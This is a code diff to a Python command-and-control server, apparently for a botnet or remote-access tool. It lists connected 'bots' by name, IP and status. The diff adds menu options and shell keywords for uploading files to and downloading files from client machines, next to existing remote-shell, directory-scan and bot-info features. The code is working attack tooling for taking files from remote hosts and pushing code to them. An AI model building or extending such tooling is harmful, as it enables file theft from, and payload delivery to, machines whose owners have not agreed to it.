@@ -85,7 +85,7 @@ class User():
                 return
 
     def send(self, msg):
-        self.conn[0].send(pickle.dumps(msg))
+        self.conn[0].sendall(pickle.dumps(msg))
         self.hist.append({'from': 'server', 'msg': msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
 
     def get_response(self, alert=True):
@@ -146,7 +146,41 @@ def clean(msg):
     except ValueError:
         return -1
 
-def get_instructions(): #todo add file down/uploading from bot, add more options
+def upload(user):
+    if user.alive:
+        file = None
+        while not file:
+            file = input('Enter file path of file to upload: ')
+            if not os.path.isfile(file):
+                file = None
+                print(warning_text + 'Enter valid file')
+        loc = input('Enter path to download file to on client: ')
+        print(f'Uploading {file} from server to {loc} on client...')
+        with open(file, 'rb') as f:
+            content = f.read()
+            msg = {'type': 'file', 'loc': loc, 'content': content}
+            f.seek(0, 2)
+            user.send({'type': 'upload', 'size': len(pickle.dumps(msg))})
+            user.send(msg)
+        response = user.get_response()
+        if response['exit'] == 0:  # todo maybe move this part to the show() function
+            print(response['msg'])
+        else:
+            print(warning_text + 'Error: ' + response['msg'])
+
+def download(user):
+    file = input('Enter file to download from client: ')
+    loc = input('Where to download file to: ')
+    user.send({'type': 'download', 'file': file})
+    response = user.get_response()
+    if response['exit'] == 0:
+        with open(loc, 'wb') as f:
+            f.write(response['msg'])
+        print('File saved successfully')
+    else:
+        print(warning_text + 'Error: ' + response['msg'])
+
+def get_instructions(): #todo add more options
     opt = get_choice(['Select a bot'], 'Main Menu')
     if opt == 0:
         if len(users) > 0:
@@ -154,21 +188,27 @@ def get_instructions(): #todo add file down/uploading from bot, add more options
             opt = get_choice([f'{user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP:port | Status')
             if opt != len(curr_users):
                 user = get_user(curr_users[opt])
-                bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs', 'Main Menu']
+                bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Upload File to Client' if not user.alive else 'Upload File to Client', Back.RED + 'Download File From Client' if not user.alive else 'Download File From Client', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs', 'Main Menu']
                 opt = get_choice(bot_opts, 'Choose an action:', subtitle=f'For: {user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}')
                 if opt == 0:
                     if user.alive:
                         print('"Exit" to exit shell')
+                        print('"download" to download a file from client, "upload" to upload a file to client')
                         print('Starting shell...')
                         user.send({'type': 'shell', 'cmd': 'get_loc'})
                         response = user.get_response(alert=False)['msg']
                         next_cmd = None
                         while next_cmd != 'exit':
                             next_cmd = input(f'{response["loc"]}>')
-                            user.send({'type': 'shell', 'cmd': next_cmd})
-                            response = user.get_response(alert=False)
-                            exit_code = response['exit']
-                            response = response['msg']
+                            if next_cmd == 'upload':
+                                upload(user)
+                            elif next_cmd == 'download':
+                                download(user)
+                            else:
+                                user.send({'type': 'shell', 'cmd': next_cmd})
+                                response = user.get_response(alert=False)
+                                exit_code = response['exit']
+                                response = response['msg']
                             if 'output' in response:
                                 #while 'working' in response:
                                 #    response = user.get_response(alert=False)['msg']
@@ -181,6 +221,16 @@ def get_instructions(): #todo add file down/uploading from bot, add more options
                     else:
                         print(warning_text + 'Dead bot, chose a live one')
                 elif opt == 1:
+                    if user.alive:
+                        upload(user)
+                    else:
+                        print(warning_text + 'Dead bot, chose a live one')
+                elif opt == 2:
+                    if user.alive:
+                        download(user)
+                    else:
+                        print(warning_text + 'Dead bot, chose a live one')
+                elif opt == 3:
                     if user.alive:
                         scan_dir = input('Enter directory to scan: ')
                         output_file = input('Enter filename to save results to (blank to display results in terminal): ')
@@ -195,7 +245,7 @@ def get_instructions(): #todo add file down/uploading from bot, add more options
                             print(standard_text + f'Wrote results from client to {output_file}')
                     else:
                         print(warning_text + 'Dead bot, chose a live one')
-                elif opt == 2:
+                elif opt == 4:
                     if user.alive:
                         user.send({'type': 'getinfo'})
                         response = user.get_response()
@@ -203,7 +253,7 @@ def get_instructions(): #todo add file down/uploading from bot, add more options
                         show(response['msg'])
                     else:
                         print(warning_text + 'Dead bot, chose a live one')
-                elif opt == 3:
+                elif opt == 5:
                     for msg in user.hist:
                         print(Fore.MAGENTA + f'{msg["timestamp"]} | {msg["from"]}: {msg["msg"]}')
         else:
